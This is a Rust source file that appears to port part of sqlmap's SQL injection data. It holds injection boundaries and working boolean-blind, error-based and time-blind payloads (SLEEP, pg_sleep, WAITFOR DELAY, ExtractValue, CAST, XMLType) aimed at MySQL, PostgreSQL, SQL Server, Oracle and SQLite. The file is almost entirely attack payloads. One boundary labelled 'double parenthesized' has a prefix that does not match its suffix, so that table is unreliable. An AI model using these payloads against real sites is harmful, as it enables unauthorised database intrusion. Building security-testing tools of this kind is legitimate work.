//! Injection payload and boundary definitions per technique.
//! Port of subsets of sqlmap `data/xml/boundaries.xml` and
//! `data/xml/payloads/{boolean_blind,error_based,time_blind}.xml`.

use sqlmap_core::injection::{Boundary, PType};

/// A payload template. Placeholders follow sqlmap conventions:
/// `[RANDNUM]`, `[RANDNUM1]` (different random number), `[RANDSTR]`,
/// `[SLEEPTIME]`.
#[derive(Debug, Clone, Copy)]
pub struct Payload {
    pub title: &'static str,
    /// DBMS tag this payload targets; None = generic (any DBMS).
    pub dbms: Option<&'static str>,
    pub level: u8,
    pub risk: u8,
    pub check: Check,
}

#[derive(Debug, Clone, Copy)]
pub enum Check {
    /// Boolean-based blind: `true_q` must compare equal to the original page,
    /// `false_q` must differ (sqlmap payloads' request/comparison pair).
    Boolean { true_q: &'static str, false_q: &'static str },
    /// Error-based: response must contain the DBMS error echoing [RANDSTR].
    Error { q: &'static str },
    /// Time-based blind: server must delay by about [SLEEPTIME] seconds.
    Time { q: &'static str },
}

/// Port of the level-1/2 entries of sqlmap `boundaries.xml` (WHERE/AND context).
pub fn boundaries() -> Vec<Boundary> {
    let mut v = Vec::new();
    let mut b = |level_where: (u8, &str), prefix: &str, suffix: &str, ptype: PType| {
        let _ = level_where;
        v.push(Boundary {
            r#where: 1,
            prefix: prefix.into(),
            suffix: suffix.into(),
            ptype,
            clause: 0,
        });
    };
    // 1: numeric, no wrapper
    b((1, "1,2,3"), "", "", PType::Numeric);
    // 2: single-quote string
    b((1, "1,2,3"), "'", " AND '[RANDSTR]'='[RANDSTR]", PType::String);
    // 3: single-quote parenthesized
    b((1, "1,2,3"), "')", " AND ('[RANDSTR]'='[RANDSTR]", PType::String);
    // 4: double parenthesized single-quote
    b((2, "1,2,3"), "')", " AND (('[RANDSTR]'='[RANDSTR]", PType::String);
    // 5: double-quote string
    b((2, "1,2,3"), "\"", " AND \"[RANDSTR]\"=\"[RANDSTR]", PType::String);
    // 6: double-quote parenthesized
    b((2, "1,2,3"), "\")", " AND (\"[RANDSTR]\"=\"[RANDSTR]", PType::String);
    // 7: numeric with comment (covers engines needing statement termination)
    b((1, "1"), "", "-- [RANDSTR]", PType::Numeric);
    // 8: single-quote with comment
    b((1, "1"), "'", "-- [RANDSTR]", PType::String);
    v
}

/// Boolean-based blind payload pairs (port of `boolean_blind.xml`, generic set).
pub fn boolean_payloads() -> Vec<Payload> {
    vec![
        Payload {
            title: "Generic boolean-based blind - AND",
            dbms: None,
            level: 1,
            risk: 1,
            check: Check::Boolean {
                true_q: "AND [RANDNUM]=[RANDNUM]",
                false_q: "AND [RANDNUM]=[RANDNUM1]",
            },
        },
        Payload {
            title: "MySQL boolean-based blind - AND (subquery)",
            dbms: Some("mysql"),
            level: 2,
            risk: 1,
            check: Check::Boolean {
                true_q: "AND (SELECT [RANDNUM] FROM (SELECT([RANDNUM]))[RANDSTR])=[RANDNUM]",
                false_q: "AND (SELECT [RANDNUM] FROM (SELECT([RANDNUM]))[RANDSTR])=[RANDNUM1]",
            },
        },
    ]
}

/// Error-based payloads (port of `error_based.xml` head entries per DBMS).
/// Detection contract: the DBMS error page echoes the [RANDSTR] marker.
pub fn error_payloads() -> Vec<Payload> {
    vec![
        Payload {
            title: "MySQL >= 5.1 AND error-based - ExtractValue",
            dbms: Some("mysql"),
            level: 1,
            risk: 1,
            check: Check::Error {
                q: "AND ExtractValue(1,CONCAT(0x7e,[RANDSTR]))",
            },
        },
        Payload {
            title: "MySQL >= 5.0 AND error-based - GROUP BY duplicate entry",
            dbms: Some("mysql"),
            level: 2,
            risk: 1,
            check: Check::Error {
                q: "AND (SELECT 2425 FROM(SELECT COUNT(*),CONCAT(0x7e,[RANDSTR],0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
            },
        },
        Payload {
            title: "PostgreSQL AND error-based - CAST",
            dbms: Some("postgresql"),
            level: 1,
            risk: 1,
            check: Check::Error {
                q: "AND [RANDNUM]=CAST((CHR(113)||[RANDSTR]) AS NUMERIC)",
            },
        },
        Payload {
            title: "Microsoft SQL Server AND error-based - CONVERT",
            dbms: Some("mssql"),
            level: 1,
            risk: 1,
            check: Check::Error {
                q: "AND [RANDNUM]=CONVERT(INT,(SELECT CHAR(113)+[RANDSTR]))",
            },
        },
        Payload {
            title: "Oracle AND error-based - XMLType",
            dbms: Some("oracle"),
            level: 2,
            risk: 1,
            check: Check::Error {
                q: "AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||[RANDSTR])) FROM DUAL)",
            },
        },
    ]
}

/// Time-based blind payloads (port of `time_blind.xml` head entries per DBMS).
pub fn time_payloads() -> Vec<Payload> {
    vec![
        Payload {
            title: "MySQL >= 5.0.12 AND time-based blind - SLEEP",
            dbms: Some("mysql"),
            level: 1,
            risk: 1,
            check: Check::Time {
                q: "AND SLEEP([SLEEPTIME])",
            },
        },
        Payload {
            title: "PostgreSQL AND time-based blind - pg_sleep",
            dbms: Some("postgresql"),
            level: 1,
            risk: 1,
            check: Check::Time {
                q: "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))",
            },
        },
        Payload {
            title: "Microsoft SQL Server time-based blind - WAITFOR DELAY",
            dbms: Some("mssql"),
            level: 1,
            risk: 1,
            check: Check::Time {
                q: "IF(1=1) WAITFOR DELAY '0:0:[SLEEPTIME]'",
            },
        },
        Payload {
            title: "Oracle AND time-based blind - DBMS_PIPE.RECEIVE_MESSAGE",
            dbms: Some("oracle"),
            level: 2,
            risk: 1,
            check: Check::Time {
                q: "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE([RANDSTR],[SLEEPTIME])",
            },
        },
        Payload {
            title: "SQLite AND time-based blind - RANDOMBLOB heavy LIKE",
            dbms: Some("sqlite"),
            level: 2,
            risk: 1,
            check: Check::Time {
                q: "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
            },
        },
    ]
}

/// Render a payload template with concrete random values (port of sqlmap's
/// payload vector expansion: randomInt, randomStr, sleepTime substitution).
pub fn render(template: &str, sleep_time: u32, rand_num: u32, rand_num1: u32, rand_str: &str) -> String {
    template
        .replace("[RANDNUM1]", &rand_num1.to_string())
        .replace("[RANDNUM]", &rand_num.to_string())
        .replace("[RANDSTR]", rand_str)
        .replace("[SLEEPTIME]", &sleep_time.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn boundaries_cover_numeric_and_string() {
        let b = boundaries();
        assert!(b.iter().any(|x| x.ptype == PType::Numeric));
        assert!(b.iter().any(|x| x.ptype == PType::String && x.prefix == "'"));
    }

    #[test]
    fn render_substitutes_all_placeholders() {
        let r = render("AND [RANDNUM]=[RANDNUM1]-- [RANDSTR]", 5, 10, 20, "ab");
        assert_eq!(r, "AND 10=20-- ab");
        let t = render("AND SLEEP([SLEEPTIME])", 3, 1, 2, "x");
        assert_eq!(t, "AND SLEEP(3)");
    }

    #[test]
    fn each_dbms_has_error_and_time() {
        for db in ["mysql", "postgresql", "mssql"] {
            assert!(error_payloads().iter().any(|p| p.dbms == Some(db)), "error {db}");
            assert!(time_payloads().iter().any(|p| p.dbms == Some(db)), "time {db}");
        }
    }
}
